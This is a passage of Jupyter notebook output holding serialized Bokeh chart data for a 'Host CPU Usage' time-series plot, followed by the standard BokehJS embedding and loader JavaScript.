AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFyPwvUofptAFK5H4XqYdEAzMzMzM4+DQFyPwvUovpZA\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Time\":{\"__ndarray__\":\"AAAAl+ctd0IAAOgF6y13QgAA0HTuLXdCAAC44/Etd0IAAKBS9S13QgAAiMH4LXdCAABwMPwtd0IAAFif/y13QgAAQA4DLndCAAAofQYud0IAABDsCS53QgAA+FoNLndCAADgyRAud0IAAMg4FC53QgAAsKcXLndCAACYFhsud0IAAICFHi53QgAAaPQhLndCAABQYyUud0IAADjSKC53QgAAIEEsLndCAAAIsC8ud0IAAPAeMy53QgAA2I02LndCAADA/Dkud0IAAKhrPS53QgAAkNpALndCAAB4SUQud0IAAGC4Ry53QgAASCdLLndCAAAwlk4ud0IAABgFUi53QgAAAHRVLndCAADo4lgud0IAANBRXC53QgAAuMBfLndCAACgL2Mud0IAAIieZi53QgAAcA1qLndCAABYfG0ud0IAAEDrcC53QgAAKFp0LndCAAAQyXcud0IAAPg3ey53QgAA4KZ+LndCAADIFYIud0IAALCEhS53QgAAmPOILndCAACAYowud0IAAGjRjy53QgAAUECTLndCAAA4r5Yud0IAACAemi53QgAACI2dLndCAADw+6Aud0IAANhqpC53QgAAwNmnLndCAACoSKsud0IAAJC3ri53QgAAeCayLndCAABglbUud0IAAEgEuS53QgAAMHO8LndCAAAY4r8ud0IAAABRwy53QgAA6L/GLndCAADQLsoud0IAALidzS53QgAAoAzRLndCAACIe9Qud0IAAHDq1y53QgAAWFnbLndCAABAyN4ud0IAACg34i53QgAAEKblLndCAAD4FOkud0IAAOCD7C53QgAAyPLvLndCAACwYfMud0IAAJjQ9i53QgAAgD/6LndCAABorv0ud0IAAFAdAS93QgAAOIwEL3dCAAAg+wcvd0IAAAhqCy93QgAA8NgOL3dCAADYRxIvd0IAAMC2FS93QgAAqCUZL3dCAACQlBwvd0IAAHgDIC93QgAAYHIjL3dCAABI4SYvd0IAADBQKi93QgAAGL8tL3dCAAAALjEvd0IAAOicNC93QgAA0As4L3dCAAC4ejsvd0IAAKDpPi93QgAAiFhCL3dCAABwx0Uvd0IAAFg2SS93QgAAQKVML3dCAAAoFFAvd0IAABCDUy93QgAA+PFWL3dCAADgYFovd0IAAMjPXS93QgAAsD5hL3dCAACYrWQvd0IAAIAcaC93QgAAaItrL3dCAABQ+m4vd0IAADhpci93QgAAINh1L3dCAAAIR3kvd0IAAPC1fC93QgAA2CSAL3dCAADAk4Mvd0IAAKgChy93QgAAkHGKL3dCAAB44I0vd0IAAGBPkS93QgAASL6UL3dCAAAwLZgvd0IAABicmy93QgAAAAufL3dCAADoeaIvd0IAANDopS93QgAAuFepL3dCAACgxqwvd0IAAIg1sC93QgAAcKSzL3dCAABYE7cvd0IAAECCui93QgAAKPG9L3dCAAAQYMEvd0IAAPjOxC93QgAA4D3IL3dCAADIrMsvd0IAALAbzy93QgAAmIrSL3dCAACA+dUvd0IAAGho2S93QgAAUNfcL3dCAAA4RuAvd0IAACC14y93QgAACCTnL3dCAADwkuovd0IAANgB7i93QgAAwHDxL3dCAACo3/Qvd0IAAJBO+C93QgAAeL37L3dCAABgLP8vd0IAAEibAjB3QgAAMAoGMHdCAAAYeQkwd0IAAADoDDB3QgAA6FYQMHdCAADQxRMwd0IAALg0FzB3QgAAoKMaMHdCAACIEh4wd0IAAHCBITB3QgAAWPAkMHdCAABAXygwd0IAACjOKzB3QgAAED0vMHdCAAD4qzIwd0IAAOAaNjB3QgAAyIk5MHdCAACw+Dwwd0IAAJhnQDB3QgAAgNZDMHdCAABoRUcwd0IAAFC0SjB3QgAAOCNOMHdCAAAgklEwd0IAAAgBVTB3QgAA8G9YMHdCAADY3lswd0IAAMBNXzB3QgAAqLxiMHdCAACQK2Ywd0IAAHiaaTB3QgAAYAltMHdCAABIeHAwd0IAADDnczB3QgAAGFZ3MHdCAAAAxXowd0IAAOgzfjB3QgAA0KKBMHdCAAC4EYUwd0IAAKCAiDB3QgAAiO+LMHdCAABwXo8wd0IAAFjNkjB3QgAAQDyWMHdCAAAoq5kwd0IAABAanTB3QgAA+IigMHdCAADg96Mwd0IAAMhmpzB3QgAAsNWqMHdCAACYRK4wd0IAAICzsTB3QgAAaCK1MHdCAABQkbgwd0IAADgAvDB3QgAAIG+/MHdCAAAI3sIwd0IAAPBMxjB3QgAA2LvJMHdCAADAKs0wd0IAAKiZ0DB3QgAAkAjUMHdCAAB4d9cwd0IAAGDm2jB3QgAASFXeMHdCAAAwxOEwd0IAABgz5TB3QgAAAKLoMHdCAADoEOwwd0IAANB/7zB3QgAAuO7yMHdCAACgXfYwd0IAAIjM+TB3QgAAcDv9MHdCAABYqgAxd0IAAEAZBDF3QgAAKIgHMXdCAAAQ9woxd0IAAPhlDjF3QgAA4NQRMXdCAADIQxUxd0IAALCyGDF3QgAAmCEcMXdCAACAkB8xd0IAAGj/IjF3QgAAUG4mMXdCAAA43Skxd0IAACBMLTF3QgAACLswMXdCAADwKTQxd0IAANiYNzF3QgAAwAc7MXdCAACodj4xd0IAAJDlQTF3QgAAeFRFMXdCAABgw0gxd0IAAEgyTDF3QgAAMKFPMXdCAAAYEFMxd0IAAAB/VjF3QgAA6O1ZMXdCAADQXF0xd0IAALjLYDF3QgAAoDpkMXdCAACIqWcxd0IAAHAYazF3QgAAWIduMXdCAABA9nExd0IAAChldTF3QgAAENR4MXdCAAD4Qnwxd0IAAOCxfzF3QgAAyCCDMXdCAACwj4Yxd0IAAJj+iTF3QgAAgG2NMXdCAABo3JAxd0IAAFBLlDF3QgAAOLqXMXdCAAAgKZsxd0IAAAiYnjF3QgAA8AaiMXdCAADYdaUxd0IAAMDkqDF3QgAAqFOsMXdCAACQwq8xd0IAAHgxszF3QgAAYKC2MXdCAABID7oxd0IAADB+vTF3QgAAGO3AMXdCAAAAXMQxd0IAAOjKxzF3QgAA0DnLMXdCAAC4qM4xd0IAAKAX0jF3QgAAiIbVMXdCAABw9dgxd0IAAFhk3DF3QgAAQNPfMXdCAAAoQuMxd0IAABCx5jF3QgAA+B/qMXdCAADgju0xd0IAAMj98DF3QgAAsGz0MXdCAACY2/cxd0IAAIBK+zF3QgAAaLn+MXdCAABQKAIyd0IAADiXBTJ3QgAAIAYJMndCAAAIdQwyd0IAAPDjDzJ3QgAA2FITMndCAADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"color\":[\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\",\"navy\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359],\"y_index\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"4839\"},\"selection_policy\":{\"id\":\"4838\"}},\"id\":\"4827\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"axis\":{\"id\":\"4808\"},\"dimension\":1,\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"4811\",\"type\":\"Grid\"},{\"attributes\":{\"text\":\"Host CPU Usage\"},\"id\":\"4794\",\"type\":\"Title\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4792\"},{\"id\":\"4812\"},{\"id\":\"4813\"},{\"id\":\"4814\"},{\"id\":\"4815\"},{\"id\":\"4816\"}]},\"id\":\"4818\",\"type\":\"Toolbar\"},{\"attributes\":{\"axis_label\":\"Data\",\"formatter\":{\"id\":\"4834\"},\"ticker\":{\"id\":\"4809\"}},\"id\":\"4808\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"4815\",\"type\":\"SaveTool\"},{\"attributes\":{\"data_source\":{\"id\":\"4827\"},\"glyph\":{\"id\":\"4829\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4830\"},\"selection_glyph\":null,\"view\":{\"id\":\"4832\"}},\"id\":\"4831\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"overlay\":{\"id\":\"4817\"}},\"id\":\"4813\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"4814\",\"type\":\"ResetTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4812\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"end\":1594292040000.0,\"start\":1592741160000.0},\"id\":\"4796\",\"type\":\"Range1d\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"Data\",\"@Data\"],[\"Time\",\"@Time\"]]},\"id\":\"4792\",\"type\":\"HoverTool\"},{\"attributes\":{},\"id\":\"4839\",\"type\":\"Selection\"},{\"attributes\":{},\"id\":\"4802\",\"type\":\"LinearScale\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4816\",\"type\":\"PanTool\"},{\"attributes\":{},\"id\":\"4851\",\"type\":\"YearsTicker\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"navy\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"4830\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"4798\",\"type\":\"DataRange1d\"},{\"attributes\":{},\"id\":\"4838\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"4850\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"4844\",\"type\":\"DaysTicker\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"4817\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"4849\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"4848\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"4842\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"source\":{\"id\":\"4827\"}},\"id\":\"4832\",\"type\":\"CDSView\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"4825\",\"type\":\"DatetimeTickFormatter\"}],\"root_ids\":[\"4793\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
       "  var render_items = [{\"docid\":\"1597ac1a-e229-415a-81b9-7944af9b94e4\",\"root_ids\":[\"4793\"],\"roots\":{\"4793\":\"a35756ef-b8cf-4596-b999-6aa78627ae18\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "4793"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"4966\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
